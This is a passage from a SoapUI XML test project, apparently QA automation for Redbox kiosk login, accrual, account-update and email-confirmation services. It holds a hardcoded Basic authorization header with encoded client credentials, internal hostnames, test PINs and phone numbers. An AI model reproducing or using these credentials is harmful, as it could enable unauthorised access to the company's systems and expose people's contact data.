requestPayload += "\"Pin\": \"$EncryptedPin\",";
requestPayload += "\"IsOffline\": false,";
requestPayload += "\"MessageType\": \"KioskLogin\"";
requestPayload += "}";


// log to soapui log
log.info("KioskOnlinePayload: $requestPayload");

// url encode json string
result = "payload=" + URLEncoder.encode(requestPayload)
testRunner.testCase.setPropertyValue("RequestBody",result)
testRunner.testCase.setPropertyValue("KioskLoginGUID",MessageId.toString()); //For MessageControl Validations
</script></con:config></con:testStep><con:testStep type="httprequest" name="HTTP Request" id="97de0111-2979-4253-bbb6-3915173a16fc" disabled="true"><con:settings/><con:config method="POST" xsi:type="con:HttpRequest" id="512d9973-227b-45d2-a888-9f219c15f810" name="HTTP Request" postQueryString="false" mediaType="application/xml" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:settings><con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;entry key="Authorization" value="Basic b29QMU9mbXdoeVdmVFRVWnFKeWZ2NDBzdTJvYTpQVEVyRklzblc5NFd6azZ0bmF1bVJlWERmYnNh" xmlns="http://eviware.com/soapui/config"/></con:setting></con:settings><con:endpoint>https://QA1WSO201.rb.local:8243/token?grant_type=client_credentials</con:endpoint><con:request>"grant_type=client_credentials"</con:request><con:credentials><con:selectedAuthProfile>No Authorization</con:selectedAuthProfile><con:addedBasicAuthenticationTypes>NTLM</con:addedBasicAuthenticationTypes><con:addedBasicAuthenticationTypes>Basic</con:addedBasicAuthenticationTypes><con:authType>No Authorization</con:authType></con:credentials><con:jmsConfig JMSDeliveryMode="PERSISTENT"/><con:parameters/><con:environmentSpec><con:entry environmentId="4af3fc93-9685-42bf-a07f-496268228e70"><con:authProfile>No Authorization</con:authProfile></con:entry><con:entry environmentId="088f2c6b-5bf5-4b7a-aea1-4ebec9f3aa3a"><con:authProfile>No Authorization</con:authProfile></con:entry><con:entry environmentId="bff3f14b-e680-473b-bba1-89a50bc86a72"><con:authProfile>No Authorization</con:authProfile></con:entry></con:environmentSpec></con:config></con:testStep><con:testStep type="httprequest" name="KioskLogin (Request)" id="31602019-092e-4145-a137-6b3340eb2e6d"><con:settings/><con:config method="POST" xsi:type="con:HttpRequest" id="2f827cec-96de-4b99-b2fc-4153a6dfe7c0" name="KioskLogin (Request)" postQueryString="false" mediaType="application/x-www-form-urlencoded" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:settings><con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;xml-fragment/></con:setting></con:settings><con:endpoint>${#Project#KSEndpoint}</con:endpoint><con:request>${#TestCase#RequestBody}</con:request><con:assertion type="GroovyScriptAssertion" id="d00fe26d-b144-4dd6-8364-96f44b303ec1" name="Script Assertion"><con:configuration><scriptText>def response = URLDecoder.decode(messageExchange.getResponseContent())
log.info ("KioskLoginResponse: $response")</scriptText></con:configuration></con:assertion><con:credentials><con:selectedAuthProfile>No Authorization</con:selectedAuthProfile><con:authType>No Authorization</con:authType></con:credentials><con:jmsConfig JMSDeliveryMode="PERSISTENT"/><con:parameters/><con:environmentSpec><con:entry environmentId="088f2c6b-5bf5-4b7a-aea1-4ebec9f3aa3a"><con:authProfile>No Authorization</con:authProfile></con:entry><con:entry environmentId="bff3f14b-e680-473b-bba1-89a50bc86a72"><con:authProfile>No Authorization</con:authProfile></con:entry></con:environmentSpec></con:config></con:testStep><con:properties><con:property><con:name>Pin</con:name><con:value>1234</con:value></con:property><con:property><con:name>MobilePhoneNumber</con:name><con:value>2247559035</con:value></con:property><con:property><con:name>KioskID</con:name><con:value>1505</con:value></con:property><con:property><con:name>EncryptedPin</con:name><con:value>N3re1i16pTE=</con:value></con:property><con:property><con:name>RequestBody</con:name><con:value>payload=%7B%22MessageId%22%3A+%22b3ecd2f6-24e5-490f-83cf-2cabcda7d779%22%2C%22KioskId%22%3A+1505%2C%22EngineVersion%22%3A+%221.15.0.6%22%2C%22BundleVersion%22%3A+%222.2.2.82%22%2C%22PhoneNumber%22%3A+%222247559035%22%2C%22Pin%22%3A+%22N3re1i16pTE%3D%22%2C%22IsOffline%22%3A+false%2C%22MessageType%22%3A+%22KioskLogin%22%7D</con:value></con:property><con:property><con:name>KioskLoginGUID</con:name><con:value>b3ecd2f6-24e5-490f-83cf-2cabcda7d779</con:value></con:property></con:properties><con:reportParameters/></con:testCase><con:testCase id="f874d232-40cc-48b3-bf85-25b89a443870" discardOkResults="true" failOnError="true" failTestCaseOnErrors="true" keepSession="false" name="EstimateAccrual" searchProperties="true" timeout="0" maxResults="0"><con:settings/><con:testStep type="jdbc" name="Warmup Script" id="d41d8e9b-cb01-4f28-b987-56d559097290"><con:settings><con:setting id="prettyPrintResponse">true</con:setting></con:settings><con:config xsi:type="con:JdbcRequestTestStep" convertColumnNamesToUpperCase="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dbConnectionName>RedboxServerDB</con:dbConnectionName><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB100.rb.local:1433;databaseName=RedboxServerDB;integratedSecurity=true;</con:connectionString><con:password>t</con:password><con:connectionProperties/><con:query>Select GetDate() AS CurrentDateTime</con:query><con:assertion type="JDBC Status" id="fb38e1dd-6a0d-4056-99de-022fce7ca757" name="JDBC Status"/><con:properties/></con:config></con:testStep><con:testStep type="datasource" name="DataSource" id="3bc1bca0-cadf-4ea2-96a2-db96a819a6ce"><con:settings/><con:config xsi:type="con:DataSourceStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dataSource type="Excel"><con:configuration><file>C:/Users/v-sakula/Documents/Work/SOAPUI/KioskServices/KS-DataSource.xls</file><worksheet>EstimateAccrual</worksheet><cell>A2</cell><ignoreEmpty>false</ignoreEmpty><evaluateFormulas>false</evaluateFormulas></con:configuration></con:dataSource><con:property>Scenario</con:property><con:property>Email</con:property><con:property>Ccnumber</con:property><con:property>CCType</con:property><con:property>PromoCode</con:property><con:property>PromoValue</con:property><con:property>KioskID</con:property><con:property>rentalFormats</con:property><con:property>numOfRentals</con:property><con:property>RentalVendStatus</con:property><con:property>loyaltyFlag</con:property><con:property>PurchaseFormats</con:property><con:property>numOfPurchases</con:property><con:property>PurchaseVendStatus</con:property><con:property>SetDaysBack</con:property><con:property>IsOffline</con:property><con:completeLastOperation>true</con:completeLastOperation><con:restartOnRun>true</con:restartOnRun></con:config></con:testStep><con:testStep type="groovy" name="Get Data" id="74c05d0a-fdd5-481b-bb08-d1cfc6033460"><con:settings/><con:config><script>import com.eviware.soapui.model.testsuite.TestRunner.Status
//def ScenarioNo =  context.expand( '${DataSource#ID}' );
//testRunner.testCase.setPropertyValue("ScenarioNo", ScenarioNo.toString())
log.info ("------------------------------START----------------------------------");
//log.info ("Scenario No: $ScenarioNo");
log.info ("Scenario:Kiosk " + context.expand( '${DataSource#Scenario}' ));
log.info ("------------------------------START----------------------------------");

//Get Data from Data Source
def ccNumber = context.expand( '${DataSource#Ccnumber}' );
def kioskID = context.expand( '${DataSource#KioskID}' );
def UseCredits = '0'; //Default to ); since credits will be disabled after Loyality is ON
def IsOffline = context.expand( '${DataSource#IsOffline}' );

//Get Encrypted CC Info using Merchant Service method.
def encryptCC = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["Generate Encrypted CCInfo"];
encryptCC.setPropertyValue("CardNumber", ccNumber);
encryptCC.setPropertyValue("KeyID", context.expand( '${#Project#KeyId}' ));

def ccrunner = encryptCC.run( null, false );	
// show that it worked out ok
log.info("Status: $ccrunner.status, time taken for TestCase was: $ccrunner.timeTaken ms");
// assert that it didn't fail
assert ccrunner.status != Status.FAILED : ccrunner.reason

//Define the Db Connection
import groovy.sql.*;
// Below line will create an object of the already created JDBC connection.
def ConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('RedboxServerDB');
def constring = ConObj.getConnectionString();
//Define the Connection
def sql = Sql.newInstance(constring);

//Get TaxRate for the Kiosk.
def taxDetails = sql.firstRow("Select Sales_Tax_Rate, PurchaseTaxRate, DigitalPurchaseTaxRate from KioskClient Where KioskClient_Id = $kioskID");
def rentalTaxRate = (taxDetails.Sales_Tax_Rate);
def purchaseTaxRate = (taxDetails.PurchaseTaxRate);
def digitalPurchaseTaxRate = (taxDetails.DigitalPurchaseTaxRate);

log.info ("KioskID:$kioskID; RentalTaxRate:$rentalTaxRate; PurchaseTaxRate:$purchaseTaxRate; DigitalPurchaseTaxRate:$digitalPurchaseTaxRate");
//Save Tax Rate at property level
testRunner.testCase.setPropertyValue('RentalTaxRate',rentalTaxRate.toString());
testRunner.testCase.setPropertyValue('PurchaseTaxRate',purchaseTaxRate.toString());
testRunner.testCase.setPropertyValue('DigitalPurchaseTaxRate',digitalPurchaseTaxRate.toString());

def getCP = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["Get Customer Info From Encrypted CC"];
getCP.setPropertyValue("CardHashId",encryptCC.getPropertyValue("CardID"));
def getCPrunner = getCP.run( null, false );	
// show that it worked out ok
log.info("Status: $getCPrunner.status, time taken for TestCase was: $getCPrunner.timeTaken ms");
// assert that it didn't fail
assert getCPrunner.status != Status.FAILED : getCPrunner.reason

//Get CustomerProfileNumber
def CustomerProfileNumber = getCP.getPropertyValue("CpCustomerNumber");
testRunner.testCase.setPropertyValue("CustomerProfileNumber",CustomerProfileNumber);
def CustomerID = getCP.getPropertyValue("CustomerId");
//Deleting the records from CustomerDisc to avoid below error
//Found an existing CustomerDisc record for disc: XXXXX, matching customer: XXXXXX!  Echo message, rolling back reconcile
log.info("Number of customerdisc records deleted: " + sql.executeUpdate("DELETE FROM CustomerDisc WHERE CustomerId in ($CustomerID)"));

//Create Credits.
if (CustomerProfileNumber != "" &amp;&amp; UseCredits == '2' &amp;&amp; IsOffline != "true")
{
	def generateCredits = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["Set Up Credits"];
	generateCredits.setPropertyValue("CpCustomerNumber",CustomerProfileNumber);
	generateCredits.setPropertyValue("DVDCreditQty",context.expand( '${DataSource#DVDCredits}' ));
	generateCredits.setPropertyValue("MovieCreditQty",context.expand( '${DataSource#MovieCredits}' ));
	generateCredits.setPropertyValue("GameCreditQty",context.expand( '${DataSource#GameCredits}' ));

	def generateCreditsrunner = generateCredits.run( null, false );	
	// show that it worked out ok
	log.info("Status: $generateCreditsrunner.status, time taken for TestCase was: $generateCreditsrunner.timeTaken ms");
	// assert that it didn't fail
	assert generateCreditsrunner.status != Status.FAILED : generateCreditsrunner.reason

	log.info ("Successfully Created Credits");
}
else
{
	log.info ("No credits required for the testCase or CustomerProfileNumber is NULL");
}</script></con:config></con:testStep><con:testStep type="groovy" name="EstimateAccrual" id="e47d382d-a228-42f1-81f7-1952470029f3"><con:settings/><con:config><script>import com.eviware.soapui.model.testsuite.TestRunner.Status
def tc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["EstimateAccrual"];
//Cleaning up the properties; set the values to NULL before the start

for(int j=0;j&lt;tc.getPropertyCount();j++)
{
   tc.getPropertyAt(j).setValue("");
}

tc.setPropertyValue("Email", context.expand( '${DataSource#Email}' ));
tc.setPropertyValue("CCNumber", context.expand( '${DataSource#Ccnumber}' ));
tc.setPropertyValue("CCType", context.expand( '${DataSource#CCType}' ));
tc.setPropertyValue("PromoCode", context.expand( '${DataSource#PromoCode}' ));
tc.setPropertyValue("PromoValue", context.expand( '${DataSource#PromoValue}' ));
tc.setPropertyValue("KioskID", context.expand( '${DataSource#KioskID}' ));
tc.setPropertyValue("rentalFormats", context.expand( '${DataSource#rentalFormats}' ));
tc.setPropertyValue("numOfRentals", context.expand( '${DataSource#numOfRentals}' ));
tc.setPropertyValue("PurchaseFormats", context.expand( '${DataSource#PurchaseFormats}' ));
tc.setPropertyValue("numOfPurchases", context.expand( '${DataSource#numOfPurchases}' ));
tc.setPropertyValue("SetDaysBack", context.expand( '${DataSource#SetDaysBack}' ));
tc.setPropertyValue("UseCredits", '0');//HardCoded to 0 since it there will be no credits in future
tc.setPropertyValue("IsOffline", context.expand( '${DataSource#IsOffline}' ));
tc.setPropertyValue("RentalTaxRate", context.expand( '${#TestCase#RentalTaxRate}' ));
tc.setPropertyValue("PurchaseTaxRate", context.expand( '${#TestCase#PurchaseTaxRate}' ));
tc.setPropertyValue("DigitalPurchaseTaxRate", context.expand( '${#TestCase#DigitalPurchaseTaxRate}' ));
tc.setPropertyValue("CustomerProfileNumber", context.expand( '${#TestCase#CustomerProfileNumber}' ));
tc.setPropertyValue("LoyaltyFlag", context.expand( '${DataSource#loyaltyFlag}' ));

//Check how to get the disc price

def runner = tc.run( null, false );
// show that it worked out ok
log.info("Status: $runner.status, time taken for TestCase [EstimateAccrual] was: $runner.timeTaken ms");
def tcStatus = (runner.status).toString()
if(tcStatus == "FAILED")
{
	assert runner.status == Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("TestCaseStatus","Authorize $tcStatus");
	testRunner.gotoStepByName("SaveResults"); //No need to run the next steps.
	testRunner.testCase.setPropertyValue("TransactionID", tc.getPropertyValue("TransactionID"));
	testRunner.testCase.setPropertyValue("InvoiceID", tc.getPropertyValue("InvoiceID"));
}
else
{
	// assert that it didn't fail
	assert runner.status != Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("TestCaseStatus","Authorize $tcStatus");
	testRunner.testCase.setPropertyValue("TransactionID", tc.getPropertyValue("TransactionID"));
	testRunner.testCase.setPropertyValue("InvoiceID", tc.getPropertyValue("InvoiceID"));
}</script></con:config></con:testStep><con:properties><con:property><con:name>TestCaseStatus</con:name><con:value>Authorize FINISHED</con:value></con:property><con:property><con:name>TransactionID</con:name><con:value/></con:property><con:property><con:name>InvoiceID</con:name><con:value/></con:property><con:property><con:name>RentalTaxRate</con:name><con:value>9.9990</con:value></con:property><con:property><con:name>PurchaseTaxRate</con:name><con:value>8.8800</con:value></con:property><con:property><con:name>DigitalPurchaseTaxRate</con:name><con:value>0.0000</con:value></con:property><con:property><con:name>CustomerProfileNumber</con:name><con:value>90855364928109</con:value></con:property></con:properties><con:reportParameters/><con:breakPoints><con:testStepId>74c05d0a-fdd5-481b-bb08-d1cfc6033460</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints></con:testCase><con:testCase id="6829e0b5-6ab8-4297-ad2e-44484dfaf46d" discardOkResults="true" failOnError="true" failTestCaseOnErrors="true" keepSession="false" name="UpdateAccount" searchProperties="true" timeout="0" maxResults="0"><con:settings/><con:testStep type="groovy" name="LoginInfo" id="88689280-c87c-415a-8607-2551ec45ecf9"><con:settings/><con:config><script>def pin = context.expand( '${#TestCase#Pin}' );
def EncryptedPin = "c:\\Temp\\EncryptPassword.exe $pin".execute().text.replaceAll("\\s","");
//log.info ("[$encryptPassword]"); 
testRunner.testCase.setPropertyValue("EncryptedPin",EncryptedPin);</script></con:config></con:testStep><con:testStep type="groovy" name="Encode Message Body (UpdateAccount)" id="0b2cbb0d-06cf-43c6-8302-06433d9f90eb"><con:settings/><con:config><script>import java.util.Date
import java.util.Calendar
import java.text.DecimalFormat;
import com.eviware.soapui.model.testsuite.TestRunner.Status;

requestPayload = "";
def EncryptedPin = context.expand( '${#TestCase#EncryptedPin}' );
def MobilePhoneNumber = context.expand( '${#TestCase#MobilePhoneNumber}' );
def KioskID = context.expand( '${#TestCase#KioskID}' );
def CustomerProfileNumber = context.expand( '${#TestCase#CustomerProfileNumber}' );
def Email = context.expand( '${#TestCase#Email}' );
def MessageId = UUID.randomUUID().toString();
//calendar = Calendar.getInstance();
//def theDate = (621355968000000000 +calendar.getTimeInMillis()*10000).toString();
//def dateString = (new Date().format("yyyy-MM-dd'T'HH:mm:ss.SSSSSSS"));

testRunner.testCase.setPropertyValue("PSValue", "$CustomerProfileNumber-$MobilePhoneNumber")
//Build Reconcile Request
requestPayload += "{";
requestPayload += "\"MessageId\": \"$MessageId\",";
requestPayload += "\"KioskId\": $KioskID,";
requestPayload += "\"EngineVersion\": \"1.15.0.6\",";
requestPayload += "\"BundleVersion\": \"2.2.2.82\",";
requestPayload += "\"CustomerProfileNumber\": $CustomerProfileNumber,";
requestPayload += "\"Email\": \"$Email\",";
requestPayload += "\"MobilePhoneNumber\": \"$MobilePhoneNumber\",";
requestPayload += "\"Pin\": \"$EncryptedPin\",";
//requestPayload += "\"Pin\": null,";
requestPayload += "\"PunchCardOptin\": true,";
requestPayload += "\"TextClubOptin\": true,";
requestPayload += "\"MessageType\": \"UpdateAccount\"";
requestPayload += "}";


// log to soapui log
log.info("UpdateAccountRequest: $requestPayload");

// url encode json string
result = "payload=" + URLEncoder.encode(requestPayload)
testRunner.testCase.setPropertyValue("RequestBody",result)
testRunner.testCase.setPropertyValue("UpdateAccountGUID",MessageId.toString()); //For MessageControl Validations
</script></con:config></con:testStep><con:testStep type="httprequest" name="UpdateAccount (Request)" id="671656aa-8146-44a5-b2df-9a67dadd85b5"><con:settings/><con:config method="POST" xsi:type="con:HttpRequest" id="2f827cec-96de-4b99-b2fc-4153a6dfe7c0" name="UpdateAccount (Request)" postQueryString="false" mediaType="application/x-www-form-urlencoded" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:settings><con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;xml-fragment/></con:setting></con:settings><con:endpoint>${#Project#KSEndpoint}</con:endpoint><con:request>${#TestCase#RequestBody}</con:request><con:assertion type="GroovyScriptAssertion" id="d00fe26d-b144-4dd6-8364-96f44b303ec1" name="Script Assertion"><con:configuration><scriptText>def response = URLDecoder.decode(messageExchange.getResponseContent())
log.info ("UpdateAccountResponse: $response")</scriptText></con:configuration></con:assertion><con:credentials><con:selectedAuthProfile>No Authorization</con:selectedAuthProfile><con:authType>No Authorization</con:authType></con:credentials><con:jmsConfig JMSDeliveryMode="PERSISTENT"/><con:parameters/><con:environmentSpec><con:entry environmentId="088f2c6b-5bf5-4b7a-aea1-4ebec9f3aa3a"><con:authProfile>No Authorization</con:authProfile></con:entry><con:entry environmentId="bff3f14b-e680-473b-bba1-89a50bc86a72"><con:authProfile>No Authorization</con:authProfile></con:entry></con:environmentSpec></con:config></con:testStep><con:testStep type="manualTestStep" name="Manual" id="12c98da2-fbe7-417e-ac6a-1d4e50507450"><con:settings/><con:config xsi:type="con:ManualTestStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/></con:testStep><con:testStep type="httprequest" name="PS-Callback-EarlyId" id="6789ae99-080a-41e8-bbe4-82c9fa021893"><con:settings/><con:config method="POST" xsi:type="con:HttpRequest" id="707c4116-498f-45cc-8820-5787b7f547cc" name="PS-Callback-EarlyId" postQueryString="false" mediaType="application/xml" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:settings><con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers"><![CDATA[<xml-fragment xmlns:con="http://eviware.com/soapui/config">
  <con:entry key="X-Event-Id" value="ReadtAPI-3r"/>
  <con:entry key="X-Event-Type" value="EarlyIDConfirm"/>
  <con:entry key="X-Callback-Id" value="EarlyIDCallback"/>
  <con:entry key="X-Delivery-Attempts" value="3"/>
  <con:entry key="X-Redbox-ActivityId" value="xr93"/>
  <con:entry key="X-Company-Id" value="ogvlwrxlxcmsfqdisuqsubbpeudagkje"/>
</xml-fragment>]]></con:setting></con:settings><con:endpoint>http://qa2opensvcapp01.rb.local/PartnerServicesV2/sms/vendor/callback/earlyid</con:endpoint><con:request><![CDATA[<?xml version="1.0" encoding="UTF-8"?>
<moMessage messageId="${#TestCase#UpdateAccountGUID}" receiptDate="2018-03-27T19:21:14-0500" attemptNumber="1">
   <source address="+1${#TestCase#MobilePhoneNumber}" carrier="104" type="MDN" />
   <destination address="727272" type="SC" />
   <message>GO</message>
</moMessage>]]></con:request><con:assertion type="Valid HTTP Status Codes" id="57f8920f-247f-475d-8989-f55cb5a18465" name="Valid HTTP Status Codes"><con:settings/><con:configuration><codes>204</codes></con:configuration></con:assertion><con:credentials><con:selectedAuthProfile>No Authorization</con:selectedAuthProfile><con:authType>No Authorization</con:authType></con:credentials><con:jmsConfig JMSDeliveryMode="PERSISTENT"/><con:parameters/><con:environmentSpec><con:entry environmentId="088f2c6b-5bf5-4b7a-aea1-4ebec9f3aa3a"><con:authProfile>No Authorization</con:authProfile></con:entry><con:entry environmentId="bff3f14b-e680-473b-bba1-89a50bc86a72"><con:authProfile>No Authorization</con:authProfile></con:entry></con:environmentSpec></con:config></con:testStep><con:properties><con:property><con:name>Pin</con:name><con:value>1111</con:value></con:property><con:property><con:name>MobilePhoneNumber</con:name><con:value>6309351861</con:value></con:property><con:property><con:name>KioskID</con:name><con:value>1505</con:value></con:property><con:property><con:name>EncryptedPin</con:name><con:value>/uEIZffiGGA=</con:value></con:property><con:property><con:name>RequestBody</con:name><con:value>payload=%7B%22MessageId%22%3A+%2266b630a0-ba2d-46cd-82ae-92e72c5ea78f%22%2C%22KioskId%22%3A+1505%2C%22EngineVersion%22%3A+%221.15.0.6%22%2C%22BundleVersion%22%3A+%222.2.2.82%22%2C%22CustomerProfileNumber%22%3A+63423427660699%2C%22Email%22%3A+%22kiosk_automation%40yahoo.com%22%2C%22MobilePhoneNumber%22%3A+%226309351861%22%2C%22Pin%22%3A+%22%2FuEIZffiGGA%3D%22%2C%22PunchCardOptin%22%3A+true%2C%22TextClubOptin%22%3A+true%2C%22MessageType%22%3A+%22UpdateAccount%22%7D</con:value></con:property><con:property><con:name>UpdateAccountGUID</con:name><con:value>66b630a0-ba2d-46cd-82ae-92e72c5ea78f</con:value></con:property><con:property><con:name>Email</con:name><con:value>kiosk_automation@yahoo.com</con:value></con:property><con:property><con:name>CustomerProfileNumber</con:name><con:value>63423427660699</con:value></con:property><con:property><con:name>PSValue</con:name><con:value>63423427660699-6309351861</con:value></con:property></con:properties><con:reportParameters/><con:breakPoints><con:testStepId>12c98da2-fbe7-417e-ac6a-1d4e50507450</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints></con:testCase><con:testCase id="9b87afa5-8c9c-4eac-8bec-06abbb576fc7" discardOkResults="true" failOnError="true" failTestCaseOnErrors="true" keepSession="false" name="EmailConfirm" searchProperties="true" timeout="0" maxResults="0"><con:settings/><con:testStep type="datasource" name="DataSource" id="19b336cf-da7d-424e-a7ad-997fd09502b4"><con:settings/><con:config xsi:type="con:DataSourceStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dataSource type="Grid"><con:configuration><check><![CDATA[<xml-fragment><con:entry xmlns:con="http://eviware.com/soapui/config">false</con:entry><con:entry xmlns:con="http://eviware.com/soapui/config">true</con:entry><con:entry xmlns:con="http://eviware.com/soapui/config">true</con:entry><con:entry xmlns:con="http://eviware.com/soapui/config">true</con:entry><con:entry xmlns:con="http://eviware.com/soapui/config">true</con:entry></xml-fragment>]]></check><row><![CDATA[<xml-fragment><con:entry xmlns:con="http://eviware.com/soapui/config">EarlyIdOptInStatus=Enrolled,TextClubOptinStatus=NotEnrolled;PunchCardOptin=true</con:entry><con:entry xmlns:con="http://eviware.com/soapui/config">Enrolled</con:entry><con:entry xmlns:con="http://eviware.com/soapui/config">NotEnrolled</con:entry><con:entry xmlns:con="http://eviware.com/soapui/config">true</con:entry><con:entry xmlns:con="http://eviware.com/soapui/config"/></xml-fragment>]]></row><row><![CDATA[<xml-fragment><con:entry xmlns:con="http://eviware.com/soapui/config">EarlyIdOptInStatus=NotEnrolled,TextClubOptinStatus=Enrolled;PunchCardOptin=true</con:entry><con:entry xmlns:con="http://eviware.com/soapui/config">NotEnrolled</con:entry><con:entry xmlns:con="http://eviware.com/soapui/config">Enrolled</con:entry><con:entry xmlns:con="http://eviware.com/soapui/config">true</con:entry><con:entry xmlns:con="http://eviware.com/soapui/config"/></xml-fragment>]]></row><row><![CDATA[<xml-fragment><con:entry xmlns:con="http://eviware.com/soapui/config">EarlyIdOptInStatus=NotEnrolled,TextClubOptinStatus=NotEnrolled;PunchCardOptin=true</con:entry><con:entry xmlns:con="http://eviware.com/soapui/config">NotEnrolled</con:entry><con:entry xmlns:con="http://eviware.com/soapui/config">NotEnrolled</con:entry><con:entry xmlns:con="http://eviware.com/soapui/config">true</con:entry><con:entry xmlns:con="http://eviware.com/soapui/config"/></xml-fragment>]]></row><row><![CDATA[<xml-fragment><con:entry xmlns:con="http://eviware.com/soapui/config">EarlyIdOptInStatus=Pending,TextClubOptinStatus=Pending;PunchCardOptin=true</con:entry><con:entry xmlns:con="http://eviware.com/soapui/config">Pending</con:entry><con:entry xmlns:con="http://eviware.com/soapui/config">Pending</con:entry><con:entry xmlns:con="http://eviware.com/soapui/config">true</con:entry><con:entry xmlns:con="http://eviware.com/soapui/config"/></xml-fragment>]]></row><row><![CDATA[<xml-fragment><con:entry xmlns:con="http://eviware.com/soapui/config">EarlyIdOptInStatus=NotEnrolled,TextClubOptinStatus=Pending;PunchCardOptin=false</con:entry><con:entry xmlns:con="http://eviware.com/soapui/config">NotEnrolled</con:entry><con:entry xmlns:con="http://eviware.com/soapui/config">Pending</con:entry><con:entry xmlns:con="http://eviware.com/soapui/config">false</con:entry><con:entry xmlns:con="http://eviware.com/soapui/config"/></xml-fragment>]]></row><recognizeAsPlainText>true</recognizeAsPlainText></con:configuration></con:dataSource><con:property>Scenario</con:property><con:property>EarlyIdOptInStatus</con:property><con:property>TextClubOptInStatus</con:property><con:property>PunchcardOptIN</con:property><con:completeLastOperation>true</con:completeLastOperation><con:restartOnRun>true</con:restartOnRun></con:config></con:testStep><con:testStep type="groovy" name="Setup" id="c4a6a661-c0a6-4f93-a9ee-3eb085c863fa"><con:settings/><con:config><script>def scenario = context.expand( '${DataSource#Scenario}' )
log.info ("##########################################################################");
log.info ("Scenario: $scenario")
log.info ("##########################################################################");</script></con:config></con:testStep><con:testStep type="jdbc" name="GetCustomerInfo" id="e3b5ec54-c444-4c8a-b79f-58442df023f1"><con:settings><con:setting id="prettyPrintResponse">true</con:setting></con:settings><con:config xsi:type="con:JdbcRequestTestStep" convertColumnNamesToUpperCase="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dbConnectionName>CustomerProfileSvc</con:dbConnectionName><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB107.rb.local:1433;databaseName=CustomerProfileSvc;integratedSecurity=true;</con:connectionString><con:password>r</con:password><con:connectionProperties/><con:query>SELECT Top 1 cpa1.CustomerProfileId,cp.LoginEmailAddress,cp.CustomerProfileNumber
FROM [dbo].[CustomerProfileAttribute] cpa1
Inner Join [dbo].[CustomerProfileAttribute] cpa2 ON cpa1.CustomerProfileId=cpa2.CustomerProfileId
Inner Join [dbo].[CustomerProfileAttribute] cpa3 ON cpa1.CustomerProfileId=cpa3.CustomerProfileId
Inner Join [dbo].CustomerProfile cp ON cp.CustomerProfileId = cpa1.CustomerProfileId
where 
--PunchCard/Loyalty
cpa1.EntityTypeAttributeId=93 and cpa1.ValueText= :PunchcardOptIN
--EarlyID 
and cpa2.EntityTypeAttributeId=113 and cpa2.ValueText= :EarlyIdOptInStatus
--TextClub
and cpa3.EntityTypeAttributeId=116 and cpa3.ValueText= :TextClubOptInStatus 
Order by cp.CustomerProfileId desc</con:query><con:assertion type="XPath Match" id="b1051d4a-47b2-4e54-b7ad-8ac6b46d6b04" name="Check for existence of [CUSTOMERPROFILEID]"><con:configuration><path>exists( //Results/ResultSet/Row/CUSTOMERPROFILEID)</path><content>true</content><allowWildcards>false</allowWildcards><ignoreNamspaceDifferences>false</ignoreNamspaceDifferences><ignoreComments>false</ignoreComments></con:configuration></con:assertion><con:properties><con:property><con:name>EarlyIdOptInStatus</con:name><con:value>${DataSource#EarlyIdOptInStatus}</con:value></con:property><con:property><con:name>TextClubOptInStatus</con:name><con:value>${DataSource#TextClubOptInStatus}</con:value></con:property><con:property><con:name>PunchcardOptIN</con:name><con:value>${DataSource#PunchcardOptIN}</con:value></con:property></con:properties></con:config></con:testStep><con:testStep type="transfer" name="Property Transfer" id="18b34936-0f8a-4b0f-ba2d-7731cc9b3212"><con:settings/><con:config xsi:type="con:PropertyTransfersStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:transfers setNullOnMissingSource="true" transferTextContent="true" failOnError="true" ignoreEmpty="false" transferToAll="false" entitize="false" transferChildNodes="false"><con:name>CustomerProfileId</con:name><con:sourceType>ResponseAsXml</con:sourceType><con:sourceStep>GetCustomerInfo</con:sourceStep><con:sourcePath>//Results[1]/ResultSet[1]/Row[1]/CUSTOMERPROFILEID[1]</con:sourcePath><con:targetType>CustomerProfileId</con:targetType><con:targetStep>#TestCase#</con:targetStep><con:targetPath/><con:upgraded>true</con:upgraded></con:transfers><con:transfers setNullOnMissingSource="true" transferTextContent="true" failOnError="true" ignoreEmpty="false" transferToAll="false" entitize="false" transferChildNodes="false"><con:name>CustomerProfileNumber</con:name><con:sourceType>ResponseAsXml</con:sourceType><con:sourceStep>GetCustomerInfo</con:sourceStep><con:sourcePath>//Results[1]/ResultSet[1]/Row[1]/CUSTOMERPROFILENUMBER[1]</con:sourcePath><con:targetType>CustomerProfileNumber</con:targetType><con:targetStep>#TestCase#</con:targetStep><con:upgraded>true</con:upgraded></con:transfers><con:transfers setNullOnMissingSource="true" transferTextContent="true" failOnError="true" ignoreEmpty="false" transferToAll="false" entitize="false" 